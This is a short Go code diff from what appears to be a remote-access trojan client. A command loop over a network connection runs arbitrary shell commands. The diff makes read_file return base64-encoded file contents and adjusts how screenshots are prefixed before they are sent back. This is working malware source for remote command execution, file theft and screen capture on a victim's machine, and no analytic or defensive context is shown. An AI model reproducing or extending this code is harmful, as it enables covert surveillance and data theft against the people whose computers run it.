@@ -32,7 +32,7 @@ func main() {
 			conn.Close()
 			os.Exit(0)
 		} else if cmd == "capturescr" {
-			result := "img:" + capture_scr()
+			result := capture_scr()
 			send_msg(conn, result)
 		} else {
 			send_msg(conn, exec_cmd(cmd))
@@ -74,7 +74,10 @@ func file_exists(file string) bool {
 }
 
 func read_file(file string) string {
-
+	if file_exists(file) {
+		return "file:" + file_b64(file)
+	}
+	return "An error occurred"
 }
 
 func capture_scr() string {
@@ -86,5 +89,5 @@ func capture_scr() string {
 	scrshot := file_b64("scrshot.png")
 	os.Remove("scrshot.png")
 	fmt.Println(scrshot)
-	return scrshot
+	return "img:" + scrshot
 }
